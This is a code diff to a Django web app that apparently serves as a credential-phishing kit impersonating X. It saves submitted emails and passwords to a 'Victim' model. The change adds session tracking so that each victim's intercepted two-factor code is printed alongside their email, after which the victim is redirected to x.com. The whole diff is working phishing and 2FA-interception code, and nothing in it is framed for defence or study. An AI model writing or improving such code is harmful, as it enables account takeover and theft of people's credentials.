@@ -11,6 +11,7 @@ def index(request):
         return render(request, "index.html")
     elif request.method == "POST":
         print(request.POST)
+        request.session["email"] = request.POST["email"]
         Victim.objects.create(
             email=request.POST["email"], password=request.POST["password"]
         )
@@ -20,7 +21,14 @@ def index(request):
 
 def twoFA(request):
     if request.method == "GET":
-        return render(request, "2FA.html")
+        email = request.session.get("email", "")
+        return render(request, "2FA.html", {"email": email})
     if request.method == "POST":
-        print("El codigo 2FA de la victima es: " + request.POST["2FACODE"])
+        print(
+            "El codigo 2FA de la victima "
+            + request.POST["email"]
+            + " es: "
+            + request.POST["2FACODE"]
+        )
+        request.session.pop("email", None)
         return HttpResponseRedirect("https://www.x.com")
